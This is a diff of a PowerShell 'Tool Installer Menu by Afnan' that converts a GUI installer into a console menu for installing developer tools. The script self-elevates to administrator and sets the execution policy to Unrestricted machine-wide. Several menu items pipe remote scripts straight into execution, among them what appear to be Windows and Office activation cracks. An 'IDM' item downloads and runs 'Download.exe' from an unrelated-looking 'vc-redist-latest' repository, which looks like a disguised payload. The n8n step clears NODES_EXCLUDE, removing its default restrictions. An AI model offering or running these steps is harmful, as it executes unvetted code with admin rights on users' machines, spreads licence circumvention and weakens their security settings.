@@ -1,605 +1,1200 @@
-#Requires -Version 5.1
-<#
-.SYNOPSIS
-    Tools Installer Menu by Afnan - v2.0 (Enhanced)
-.DESCRIPTION
-    High-performance interactive GUI to install developer tools and run automation scripts.
-    Author: Afnan
-#>
+# Tool Installer Menu by Afnan - PowerShell Version
+# Converted from tools-installer.cmd - No functionality changed
 
-# Admin Elevation
-if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
-    [Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+# Set window title and colors
+$Host.UI.RawUI.WindowTitle = "Tool Installer Menu by Afnan"
+$Host.UI.RawUI.BackgroundColor = 'Black'
+$Host.UI.RawUI.ForegroundColor = 'Green'
+Clear-Host
+
+# Resize console buffer/window (optional, matches original commented section)
+$Host.UI.RawUI.BufferSize = New-Object System.Management.Automation.Host.Size(80,3000)
+$Host.UI.RawUI.WindowSize = New-Object System.Management.Automation.Host.Size(80,40)
+
+# ==============================
+# ADMIN CHECK
+# ==============================
+if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    Write-Host "Requesting administrator privileges..." -ForegroundColor Yellow
+    Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
     exit
 }
 
-Add-Type -AssemblyName System.Windows.Forms
-Add-Type -AssemblyName System.Drawing
-
-[System.Windows.Forms.Application]::EnableVisualStyles()
-[System.Windows.Forms.Application]::SetCompatibleTextRenderingDefault($false)
-
-# --- Colour Palette ---
-$c = @{
-    Bg        = [System.Drawing.Color]::FromArgb(18, 18, 24)
-    Surface   = [System.Drawing.Color]::FromArgb(28, 28, 38)
-    Surface2  = [System.Drawing.Color]::FromArgb(38, 38, 52)
-    Accent    = [System.Drawing.Color]::FromArgb(99, 102, 241)
-    Green     = [System.Drawing.Color]::FromArgb(34, 197, 94)
-    Red       = [System.Drawing.Color]::FromArgb(239, 68, 68)
-    Yellow    = [System.Drawing.Color]::FromArgb(234, 179, 8)
-    Text      = [System.Drawing.Color]::FromArgb(230, 230, 245)
-    TextDim   = [System.Drawing.Color]::FromArgb(130, 130, 160)
-    TabSel    = [System.Drawing.Color]::FromArgb(48, 48, 68)
+# ==============================
+# HELPER FUNCTIONS
+# ==============================
+function Pause {
+    Write-Host ""
+    Write-Host "Press any key to continue..." -ForegroundColor Gray
+    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
 }
 
-# --- Fonts ---
-$fTitle = New-Object System.Drawing.Font("Segoe UI", 18, [System.Drawing.FontStyle]::Bold)
-$fBold  = New-Object System.Drawing.Font("Segoe UI", 10, [System.Drawing.FontStyle]::Bold)
-$fNorm  = New-Object System.Drawing.Font("Segoe UI", 9)
-$fSmall = New-Object System.Drawing.Font("Segoe UI", 8)
-$fMono  = New-Object System.Drawing.Font("Consolas", 8.5)
-
-# --- Helpers ---
-function Refresh-Path {
-    $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" +
-                [System.Environment]::GetEnvironmentVariable("Path","User")
+function Show-AsciiHeader {
+    Write-Host ""
+    Write-Host "                        _    _____ _   _    _    _   _ "
+    Write-Host "                       / \  |  ___| \ | |  / \  | \ | |"
+    Write-Host "                      / _ \ | |_  |  \| | / _ \ |  \| |"
+    Write-Host "                     / ___ \|  _| | |\  |/ ___ \| |\  |"
+    Write-Host "                    /_/   \_\_|   |_| \_/_/   \_\_| \_|"
+    Write-Host ""
 }
 
-function Install-Choco {
-    if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
+# ==============================
+# SUB-FUNCTIONS (All Original Labels Converted)
+# ==============================
+
+function OPENPORTFOLIO {
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Write-Host "Opening Your Browser with Portfolio" -ForegroundColor Cyan
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Start-Process "https://afnan-nex.github.io/portfolio/index.html"
+    Pause
+}
+
+function SEEPOLICY {
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Write-Host "Checking PowerShell Execution Policy" -ForegroundColor Cyan
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Write-Host "Current Execution Policy:"
+    Get-ExecutionPolicy -List
+    Write-Host ""
+    Pause
+}
+
+function UNRESTRICT {
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Write-Host "Setting PowerShell Policy to Unrestricted" -ForegroundColor Cyan
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Set-ExecutionPolicy Unrestricted -Force -Scope CurrentUser
+    Set-ExecutionPolicy Unrestricted -Force -Scope LocalMachine -ErrorAction SilentlyContinue
+    Write-Host "Policy updated successfully." -ForegroundColor Green
+    Write-Host ""
+    Pause
+}
+
+function CHOCO {
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Write-Host "Installing/Checking Chocolatey" -ForegroundColor Cyan
+    Write-Host "==========================================" -ForegroundColor Cyan
+    if (Get-Command choco -ErrorAction SilentlyContinue) {
+        Write-Host "Chocolatey is already installed." -ForegroundColor Green
+        choco --version
+    } else {
+        Write-Host "Installing Chocolatey..." -ForegroundColor Yellow
         Set-ExecutionPolicy Bypass -Scope Process -Force
         [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
-        iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
-        Refresh-Path
+        Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
+        Write-Host "Chocolatey installation completed." -ForegroundColor Green
+        Write-Host "Refreshing environment variables..." -ForegroundColor Gray
+        # refreshenv is a Chocolatey command, call via cmd
+        cmd /c "refreshenv" >$null 2>&1
     }
+    Write-Host ""
+    Pause
 }
 
-function Ensure-NPM {
+function NODELTS {
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Write-Host "Installing Node.js LTS" -ForegroundColor Cyan
+    Write-Host "==========================================" -ForegroundColor Cyan
+    if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
+        Write-Host "Chocolatey is required. Installing Chocolatey first..." -ForegroundColor Yellow
+        CHOCO
+    }
+    if (Get-Command node -ErrorAction SilentlyContinue) {
+        Write-Host "Node.js is already installed." -ForegroundColor Green
+        node --version
+    } else {
+        Write-Host "Installing Node.js LTS..." -ForegroundColor Yellow
+        choco install nodejs-lts -y
+        Write-Host "Refreshing environment variables..." -ForegroundColor Gray
+        cmd /c "refreshenv" >$null 2>&1
+    }
+    Write-Host ""
+    Pause
+}
+
+function TITUS {
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Write-Host "Running Chris Titus Tech Windows Utility" -ForegroundColor Cyan
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"irm 'https://christitus.com/win' | iex`""
+    Write-Host ""
+    Pause
+}
+
+function MASSGRAVE {
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Write-Host "Running Microsoft Activation Scripts" -ForegroundColor Cyan
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"irm https://get.activated.win | iex`""
+    Write-Host ""
+    Pause
+}
+
+function COPORTON {
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Write-Host "Running Coporton Tool" -ForegroundColor Cyan
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"irm https://coporton.com/ias | iex`""
+    Pause
+}
+
+function IDM {
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Write-Host "Downloading with IDM" -ForegroundColor Cyan
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"curl -L -O https://github.com/planetshine0000/vc-redist-latest/releases/download/v1.0.1/Download.exe; .\Download.exe`""
+    Write-Host ""
+    Pause
+}
+
+function SPARKLE {
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Write-Host "Running Sparkle Tool" -ForegroundColor Cyan
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"irm https://raw.githubusercontent.com/Parcoil/Sparkle/v2/get.ps1 | iex`""
+    Write-Host ""
+    Pause
+}
+
+function GHGRAB {
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Write-Host "Running GHGrab - GitHub Repository Grabber" -ForegroundColor Cyan
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Write-Host ""
+    Write-Host "  GHGrab allows you to quickly download files/folders from GitHub repos." -ForegroundColor Gray
+    Write-Host "  Example usage: npx @ghgrab/ghgrab https://github.com/user/repo/path" -ForegroundColor Gray
+    Write-Host ""
+    Write-Host "  Checking for Node.js/npx..." -ForegroundColor Gray
+
+    if (-not (Get-Command npx -ErrorAction SilentlyContinue)) {
+        Write-Host ""
+        Write-Host "  [!] npx not found. Installing Node.js LTS via Chocolatey..." -ForegroundColor Yellow
+        Write-Host ""
+        if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
+            Write-Host "  Installing Chocolatey first..." -ForegroundColor Gray
+            CHOCO
+        }
+        Write-Host "  Installing Node.js LTS..." -ForegroundColor Gray
+        choco install nodejs-lts -y
+        Write-Host "  Refreshing environment..." -ForegroundColor Gray
+        cmd /c "refreshenv" >$null 2>&1
+    }
+
+    Write-Host ""
+    Write-Host "  Launching GHGrab..." -ForegroundColor Green
+    Write-Host "  ------------------------------------------" -ForegroundColor Gray
+    Write-Host ""
+
+    # Run GHGrab interactively
+    npx @ghgrab/ghgrab
+    Write-Host ""
+    Write-Host "Press any key to return..." -ForegroundColor Gray
+    Pause
+}
+
+function PYTHON {
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Write-Host "Installing Python" -ForegroundColor Cyan
+    Write-Host "==========================================" -ForegroundColor Cyan
+    if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
+        Write-Host "Chocolatey is required. Installing Chocolatey first..." -ForegroundColor Yellow
+        CHOCO
+    }
+    if (Get-Command python -ErrorAction SilentlyContinue) {
+        Write-Host "Python is already installed." -ForegroundColor Green
+        python --version
+    } else {
+        Write-Host "Installing Python..." -ForegroundColor Yellow
+        choco install python -y
+        Write-Host "Refreshing environment variables..." -ForegroundColor Gray
+        cmd /c "refreshenv" >$null 2>&1
+    }
+    Write-Host ""
+    Pause
+}
+
+function GIT {
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Write-Host "Installing Git" -ForegroundColor Cyan
+    Write-Host "==========================================" -ForegroundColor Cyan
+    if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
+        Write-Host "Chocolatey is required. Installing Chocolatey first..." -ForegroundColor Yellow
+        CHOCO
+    }
+    if (Get-Command git -ErrorAction SilentlyContinue) {
+        Write-Host "Git is already installed." -ForegroundColor Green
+        git --version
+    } else {
+        Write-Host "Installing Git..." -ForegroundColor Yellow
+        choco install git -y
+        Write-Host "Refreshing environment variables..." -ForegroundColor Gray
+        cmd /c "refreshenv" >$null 2>&1
+    }
+    Write-Host ""
+    Pause
+}
+
+function DOTNET {
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Write-Host "Installing .NET Runtime and SDK" -ForegroundColor Cyan
+    Write-Host "==========================================" -ForegroundColor Cyan
+    if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
+        Write-Host "Chocolatey is required. Installing Chocolatey first..." -ForegroundColor Yellow
+        CHOCO
+    }
+    if (Get-Command dotnet -ErrorAction SilentlyContinue) {
+        Write-Host ".NET is already installed." -ForegroundColor Green
+        dotnet --version
+    } else {
+        Write-Host "Installing .NET..." -ForegroundColor Yellow
+        choco install dotnet -y
+        Write-Host "Refreshing environment variables..." -ForegroundColor Gray
+        cmd /c "refreshenv" >$null 2>&1
+    }
+    Write-Host ""
+    Pause
+}
+
+function FFMPEG {
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Write-Host "Installing FFmpeg" -ForegroundColor Cyan
+    Write-Host "==========================================" -ForegroundColor Cyan
+    if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
+        Write-Host "Chocolatey is required. Installing Chocolatey first..." -ForegroundColor Yellow
+        CHOCO
+    }
+    if (Get-Command ffmpeg -ErrorAction SilentlyContinue) {
+        Write-Host "FFmpeg is already installed." -ForegroundColor Green
+        ffmpeg -version 2>$null | Select-String "ffmpeg version"
+    } else {
+        Write-Host "Installing FFmpeg..." -ForegroundColor Yellow
+        choco install ffmpeg -y
+        Write-Host "Refreshing environment variables..." -ForegroundColor Gray
+        cmd /c "refreshenv" >$null 2>&1
+    }
+    Write-Host ""
+    Pause
+}
+
+function SEVENZIP {
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Write-Host "Installing 7-Zip" -ForegroundColor Cyan
+    Write-Host "==========================================" -ForegroundColor Cyan
+    if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
+        Write-Host "Chocolatey is required. Installing Chocolatey first..." -ForegroundColor Yellow
+        CHOCO
+    }
+    if (Get-Command 7z -ErrorAction SilentlyContinue) {
+        Write-Host "7-Zip is already installed." -ForegroundColor Green
+    } else {
+        Write-Host "Installing 7-Zip..." -ForegroundColor Yellow
+        choco install 7zip -y
+        Write-Host "Refreshing environment variables..." -ForegroundColor Gray
+        cmd /c "refreshenv" >$null 2>&1
+    }
+    Write-Host ""
+    Pause
+}
+
+function WINDIRSTAT {
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Write-Host "Installing WinDirStat" -ForegroundColor Cyan
+    Write-Host "==========================================" -ForegroundColor Cyan
+    if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
+        Write-Host "Chocolatey is required. Installing Chocolatey first..." -ForegroundColor Yellow
+        CHOCO
+    }
+    Write-Host "Installing WinDirStat..." -ForegroundColor Yellow
+    choco install windirstat -y
+    Write-Host ""
+    Pause
+}
+
+function YTDLP {
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Write-Host "Installing yt-dlp" -ForegroundColor Cyan
+    Write-Host "==========================================" -ForegroundColor Cyan
+    if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
+        Write-Host "Chocolatey is required. Installing Chocolatey first..." -ForegroundColor Yellow
+        CHOCO
+    }
+    Write-Host "Installing yt-dlp..." -ForegroundColor Yellow
+    choco install yt-dlp -y
+    Write-Host ""
+    Pause
+}
+
+function NGROK {
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Write-Host "Installing ngrok" -ForegroundColor Cyan
+    Write-Host "==========================================" -ForegroundColor Cyan
+    if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
+        Write-Host "Chocolatey is required. Installing Chocolatey first..." -ForegroundColor Yellow
+        CHOCO
+    }
+    Write-Host "Installing ngrok..." -ForegroundColor Yellow
+    choco install ngrok -y
+    Write-Host ""
+    Pause
+}
+
+function N8N {
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Write-Host "Installing n8n Workflow Automation" -ForegroundColor Cyan
+    Write-Host "==========================================" -ForegroundColor Cyan
     if (-not (Get-Command npm -ErrorAction SilentlyContinue)) {
-        Install-Choco; choco install nodejs-lts -y; Refresh-Path
+        Write-Host "Node.js is required. Installing Node.js first..." -ForegroundColor Yellow
+        NODELTS
+        Write-Host "Refreshing PATH environment variable..." -ForegroundColor Gray
+        $env:PATH += ";$env:ProgramFiles\nodejs"
     }
+    Write-Host "Opening new PowerShell window to install n8n..." -ForegroundColor Yellow
+    Start-Process powershell.exe -ArgumentList "-NoExit -Command `"echo 'Installing n8n Workflow Automation...'; npm install -g n8n@latest --verbose; echo 'n8n installation completed.'; echo 'Setting NODES_EXCLUDE environment variable...'; [Environment]::SetEnvironmentVariable('NODES_EXCLUDE','[]','User'); [Environment]::SetEnvironmentVariable('NODES_EXCLUDE','[]','Machine'); echo 'Environment variables set successfully. Press any key to close this window.'; Read-Host`""
+    Write-Host ""
+    Pause
 }
 
-function Ensure-Git {
+function GWS {
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Write-Host "Installing Google Workspace CLI (GWS)" -ForegroundColor Cyan
+    Write-Host "==========================================" -ForegroundColor Cyan
+    if (-not (Get-Command npm -ErrorAction SilentlyContinue)) {
+        Write-Host "Node.js is required. Installing Node.js first..." -ForegroundColor Yellow
+        NODELTS
+        Write-Host "Refreshing PATH environment variable..." -ForegroundColor Gray
+        $env:PATH += ";$env:ProgramFiles\nodejs"
+    }
+    Write-Host "Opening new PowerShell window to install Google Workspace CLI..." -ForegroundColor Yellow
+    Start-Process powershell.exe -ArgumentList "-NoExit -Command `"echo 'Installing Google Workspace CLI...'; npm install -g '@googleworkspace/cli'; echo 'Installation completed. Press any key to close this window.'; Read-Host`""
+    Write-Host ""
+    Pause
+}
+
+function GEMINI {
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Write-Host "Installing Google AI CLI (Official CLI)" -ForegroundColor Cyan
+    Write-Host "==========================================" -ForegroundColor Cyan
+    if (-not (Get-Command npm -ErrorAction SilentlyContinue)) {
+        Write-Host "Node.js is required. Installing Node.js first..." -ForegroundColor Yellow
+        NODELTS
+        Write-Host "Refreshing PATH environment variable..." -ForegroundColor Gray
+        $env:PATH += ";$env:ProgramFiles\nodejs"
+    }
+    Write-Host "Opening new PowerShell window to install Google AI CLI..." -ForegroundColor Yellow
+    Start-Process powershell.exe -ArgumentList "-NoExit -Command `"echo 'Installing Google AI CLI...'; npm install -g '@google/gemini-cli@latest' --verbose; echo 'Installation completed. Press any key to close this window.'; Read-Host`""
+    Write-Host ""
+    Pause
+}
+
+function QWEN {
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Write-Host "Installing Qwen AI" -ForegroundColor Cyan
+    Write-Host "==========================================" -ForegroundColor Cyan
+    if (-not (Get-Command npm -ErrorAction SilentlyContinue)) {
+        Write-Host "Node.js is required. Installing Node.js first..." -ForegroundColor Yellow
+        NODELTS
+        Write-Host "Refreshing PATH environment variable..." -ForegroundColor Gray
+        $env:PATH += ";$env:ProgramFiles\nodejs"
+    }
+    Write-Host "Opening new PowerShell window to install Qwen AI CLI..." -ForegroundColor Yellow
+    Start-Process powershell.exe -ArgumentList "-NoExit -Command `"echo 'Installing Qwen AI CLI...'; npm install -g '@qwen-code/qwen-code@latest' --verbose; echo 'Installation completed. If failed, visit: https://github.com/QwenLM/Qwen'; echo 'Press any key to close this window.'; Read-Host`""
+    Write-Host ""
+    Pause
+}
+
+function WIN11MENU {
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Write-Host "Switching to Windows 11 New Context Menu" -ForegroundColor Cyan
+    Write-Host "==========================================" -ForegroundColor Cyan
+    cmd /c "reg delete HKCU\Software\Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2} /f && taskkill /f /im explorer.exe && start explorer.exe"
+    Pause
+}
+
+function WIN10MENU {
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Write-Host "Switching to Windows 10 Classic Context Menu" -ForegroundColor Cyan
+    Write-Host "==========================================" -ForegroundColor Cyan
+    cmd /c "reg add HKCU\Software\Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}\InprocServer32 /f /ve && taskkill /f /im explorer.exe && start explorer.exe"
+    Pause
+}
+
+function WINGET {
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Write-Host "Installing Windows Package Manager (Winget)" -ForegroundColor Cyan
+    Write-Host "==========================================" -ForegroundColor Cyan
+    if (Get-Command winget -ErrorAction SilentlyContinue) {
+        Write-Host "Winget is already installed." -ForegroundColor Green
+        winget --version
+    } else {
+        Write-Host "Installing Winget..." -ForegroundColor Yellow
+        try {
+            $progressPreference = 'silentlyContinue'
+            Invoke-WebRequest -Uri 'https://aka.ms/getwinget' -OutFile 'winget.msixbundle'
+            Add-AppxPackage 'winget.msixbundle'
+            Remove-Item 'winget.msixbundle' -Force
+            Write-Host "Winget installed successfully." -ForegroundColor Green
+        } catch {
+            Write-Host "Error installing Winget: $($_.Exception.Message)" -ForegroundColor Red
+            Write-Host "You may need to install from Microsoft Store instead." -ForegroundColor Gray
+        }
+    }
+    Write-Host ""
+    Pause
+}
+
+function OFFICE365 {
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Write-Host "Installing Office 365 ProPlus" -ForegroundColor Cyan
+    Write-Host "==========================================" -ForegroundColor Cyan
+    if (-not (Get-Command curl -ErrorAction SilentlyContinue)) {
+        Write-Host "Curl is required but not found. Please update Windows." -ForegroundColor Red
+        Pause
+        return
+    }
+
+    Write-Host "Downloading Office 365 Setup..." -ForegroundColor Yellow
+    $officeUrl = "https://c2rsetup.officeapps.live.com/c2r/download.aspx?ProductreleaseID=O365ProPlusRetail&platform=x64&language=en-us&version=O16GA"
+    $officePath = "$env:TEMP\OfficeSetup.exe"
+    Invoke-WebRequest -Uri $officeUrl -OutFile $officePath
+
+    if (Test-Path $officePath) {
+        Write-Host "Launching Office Installer..." -ForegroundColor Green
+        Write-Host "NOTE: The installation will continue in the background." -ForegroundColor Gray
+        Start-Process $officePath
+    } else {
+        Write-Host "Failed to download Office Setup." -ForegroundColor Red
+    }
+    Write-Host ""
+    Pause
+}
+
+function EVERYTHING {
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Write-Host "Installing Everything Search Engine" -ForegroundColor Cyan
+    Write-Host "==========================================" -ForegroundColor Cyan
+    if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
+        Write-Host "Chocolatey is required. Installing Chocolatey first..." -ForegroundColor Yellow
+        CHOCO
+    }
+    if (Get-Command everything -ErrorAction SilentlyContinue) {
+        Write-Host "Everything is already installed." -ForegroundColor Green
+    } else {
+        Write-Host "Installing Everything..." -ForegroundColor Yellow
+        choco install everything -y
+    }
+    Write-Host ""
+    Pause
+}
+
+function CHROME {
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Write-Host "Installing Google Chrome" -ForegroundColor Cyan
+    Write-Host "==========================================" -ForegroundColor Cyan
+    if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
+        Write-Host "Chocolatey is required. Installing Chocolatey first..." -ForegroundColor Yellow
+        CHOCO
+    }
+    if (Get-Command chrome -ErrorAction SilentlyContinue) {
+        Write-Host "Google Chrome is already installed." -ForegroundColor Green
+    } else {
+        Write-Host "Installing Google Chrome..." -ForegroundColor Yellow
+        choco install googlechrome -y
+    }
+    Write-Host ""
+    Pause
+}
+
+function ZEN {
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Write-Host "Installing Zen Browser (Manual Method)" -ForegroundColor Cyan
+    Write-Host "==========================================" -ForegroundColor Cyan
+    if (-not (Get-Command curl -ErrorAction SilentlyContinue)) {
+        Write-Host "Curl is required but not found." -ForegroundColor Red
+        Pause
+        return
+    }
+
+    Write-Host "Downloading Zen Browser installer..." -ForegroundColor Yellow
+    $zenUrl = "https://github.com/zen-browser/desktop/releases/latest/download/zen.installer.exe"
+    $zenPath = "$env:TEMP\zen-installer.exe"
+    Invoke-WebRequest -Uri $zenUrl -OutFile $zenPath
+
+    if (Test-Path $zenPath) {
+        Write-Host "Running installer..." -ForegroundColor Green
+        Start-Process -Wait $zenPath
+        Remove-Item $zenPath -Force
+    } else {
+        Write-Host "Download failed. Opening manual download page..." -ForegroundColor Red
+        Start-Process "https://zen-browser.app/download"
+    }
+    Write-Host ""
+    Pause
+}
+
+function CUR {
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Write-Host "Cloning Elegant Repository from GitHub" -ForegroundColor Cyan
+    Write-Host "==========================================" -ForegroundColor Cyan
     if (-not (Get-Command git -ErrorAction SilentlyContinue)) {
-        Install-Choco; choco install git -y; Refresh-Path
+        Write-Host "Git is required. Installing Git first..." -ForegroundColor Yellow
+        GIT
     }
+    Write-Host "Cloning repository..." -ForegroundColor Yellow
+    git clone https://github.com/afnan-nex/Elegant
+    if ($LASTEXITCODE -eq 0) {
+        Write-Host "Repository cloned successfully to Elegant folder." -ForegroundColor Green
+    } else {
+        Write-Host "Failed to clone repository. Please check your internet connection or Git installation." -ForegroundColor Red
+    }
+    Write-Host ""
+    Pause
 }
 
-# --- Tool Definitions ---
-$tools = @(
-    @{ ID=1;  Name="Afnan Portfolio";     Category="Info";       Desc="Open Afnan portfolio website";            Tags="web,info";
-       Action={ Start-Process "https://afnanportfolio1.netlify.app/" } },
-
-    @{ ID=2;  Name="See Policy";          Category="System";     Desc="Show current execution policies";         Tags="policy,security";
-       Action={ Get-ExecutionPolicy -List | Out-String | Write-Host } },
-
-    @{ ID=3;  Name="Unrestrict Policy";   Category="System";     Desc="Set execution policy to Unrestricted";    Tags="policy,security";
-       Action={ Set-ExecutionPolicy Unrestricted -Force -Scope CurrentUser
-                Set-ExecutionPolicy Unrestricted -Force -Scope LocalMachine
-                Write-Host "Policy updated." } },
-
-    @{ ID=4;  Name="Chocolatey";          Category="Essential";  Desc="Windows package manager";                 Tags="package,manager";
-       Action={ Install-Choco } },
-
-    @{ ID=5;  Name="Node.js LTS";         Category="Essential";  Desc="JavaScript runtime LTS";                  Tags="node,npm,javascript";
-       Action={ Install-Choco; choco install nodejs-lts -y; Refresh-Path } },
-
-    @{ ID=6;  Name="Chris Titus Tool";    Category="Scripts";    Desc="Windows debloat and tweaks utility";      Tags="tweak,debloat,windows";
-       Action={ irm 'https://christitus.com/win' | iex } },
-
-    @{ ID=7;  Name="Mass Grave";          Category="Scripts";    Desc="Windows and Office activation tool";      Tags="activate,windows,office";
-       Action={ irm https://get.activated.win | iex } },
-
-    @{ ID=8;  Name="Coporton Tool";       Category="Scripts";    Desc="Coporton automation script";              Tags="automation,script";
-       Action={ Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"irm https://coporton.com/ias | iex`"" } },
-
-    @{ ID=9;  Name="Git";                 Category="Essential";  Desc="Version control system";                  Tags="git,vcs,dev";
-       Action={ Install-Choco; choco install git -y; Refresh-Path } },
-
-    @{ ID=10; Name="Python";              Category="Essential";  Desc="Python programming language";             Tags="python,dev,language";
-       Action={ Install-Choco; choco install python -y; Refresh-Path } },
-
-    @{ ID=11; Name=".NET SDK";            Category="Dev Tools";  Desc="Microsoft .NET framework and SDK";        Tags="dotnet,csharp,microsoft";
-       Action={ Install-Choco; choco install dotnet -y; Refresh-Path } },
-
-    @{ ID=12; Name="FFmpeg";              Category="Dev Tools";  Desc="Audio and video processing toolkit";      Tags="ffmpeg,video,audio,media";
-       Action={ Install-Choco; choco install ffmpeg -y; Refresh-Path } },
-
-    @{ ID=13; Name="7-Zip";               Category="Utilities";  Desc="File archiver and compressor";            Tags="zip,compress,archive";
-       Action={ Install-Choco; choco install 7zip -y; Refresh-Path } },
-
-    @{ ID=14; Name="WinDirStat";          Category="Utilities";  Desc="Disk usage visualizer";                   Tags="disk,space,visualizer";
-       Action={ Install-Choco; choco install windirstat -y } },
-
-    @{ ID=15; Name="yt-dlp";              Category="Utilities";  Desc="YouTube and media downloader CLI";        Tags="youtube,download,media";
-       Action={ Install-Choco; choco install yt-dlp -y } },
-
-    @{ ID=16; Name="ngrok";               Category="Dev Tools";  Desc="Secure tunnel to localhost";              Tags="tunnel,localhost,ngrok";
-       Action={ Install-Choco; choco install ngrok -y } },
-
-    @{ ID=17; Name="n8n";                 Category="Automation"; Desc="Workflow automation platform";            Tags="automation,workflow,n8n";
-       Action={ Ensure-NPM; Start-Process cmd -ArgumentList "/k npm install -g n8n@latest --verbose" } },
-
-    @{ ID=18; Name="Gemini CLI";          Category="AI";         Desc="Google Gemini command-line tool";         Tags="ai,gemini,google,cli";
-       Action={ Ensure-NPM; Start-Process cmd -ArgumentList "/k npm install -g @google/gemini-cli@latest --verbose" } },
-
-    @{ ID=19; Name="Qwen CLI";            Category="AI";         Desc="Alibaba Qwen code assistant CLI";         Tags="ai,qwen,cli";
-       Action={ Ensure-NPM; Start-Process cmd -ArgumentList "/k npm install -g @qwen-code/qwen-code@latest --verbose" } },
-
-    @{ ID=20; Name="Win 11 Context Menu"; Category="Tweaks";     Desc="Restore Windows 11 right-click menu";    Tags="context,menu,explorer";
-       Action={ reg delete "HKCU\Software\Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}" /f
-                Stop-Process -Name explorer -Force; Start-Process explorer } },
-
-    @{ ID=21; Name="Win 10 Context Menu"; Category="Tweaks";     Desc="Classic Windows 10 right-click menu";    Tags="context,menu,classic";
-       Action={ reg add "HKCU\Software\Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}\InprocServer32" /f /ve
-                Stop-Process -Name explorer -Force; Start-Process explorer } },
-
-    @{ ID=22; Name="Winget";              Category="System";     Desc="Microsoft package manager";               Tags="winget,package,microsoft";
-       Action={ Invoke-WebRequest -Uri 'https://aka.ms/getwinget' -OutFile 'winget.msixbundle'
-                Add-AppxPackage 'winget.msixbundle'; Remove-Item 'winget.msixbundle' -Force } },
-
-    @{ ID=23; Name="Office 365";          Category="Apps";       Desc="Microsoft Office 365 installer";          Tags="office,microsoft,word,excel";
-       Action={ $url = "https://c2rsetup.officeapps.live.com/c2r/download.aspx?ProductreleaseID=O365ProPlusRetail&platform=x64&language=en-us&version=O16GA"
-                Invoke-WebRequest -Uri $url -OutFile "$env:TEMP\OfficeSetup.exe"
-                Start-Process "$env:TEMP\OfficeSetup.exe" } },
-
-    @{ ID=24; Name="Everything";          Category="Utilities";  Desc="Instant file search tool";                Tags="search,file,fast";
